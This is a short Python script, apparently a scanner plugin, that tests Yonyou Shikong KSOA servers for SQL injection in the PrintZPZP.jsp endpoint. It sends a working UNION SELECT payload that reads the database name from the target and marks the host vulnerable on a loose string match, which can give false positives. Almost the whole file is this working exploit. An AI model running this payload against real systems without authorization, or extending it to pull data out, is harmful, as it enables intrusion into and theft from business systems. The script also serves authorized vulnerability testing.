import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友时空KSOA系统接口PrintZPZP.jsp存在SQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
    }
    vurl = urllib.parse.urljoin(url, "/kp/PrintZPZP.jsp?zpshqid=1%27+union+select+1,2,db_name(),4,5,6,7,8,9,10,11,12,13+--+")
    try:
        response = requests.get(vurl, headers=headers)
        if (response.status_code == 200 and '12' in response.text and '13' in response.text) or 'ksoa' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult